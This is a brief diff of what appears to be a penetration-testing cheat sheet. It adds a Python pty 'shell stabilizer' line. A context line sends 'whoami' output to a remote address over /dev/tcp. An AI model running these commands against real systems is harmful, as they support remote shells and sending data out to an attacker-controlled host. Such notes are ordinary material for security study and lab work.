@@ -81,3 +81,6 @@ powershell -Command "$env:comspec"
 
 whoami >> /dev/tcp/10.10.10.5/1337
 
+
+python -c 'import pty; pty.spawn("/bin/bash")' ---- shell stabilizer
+
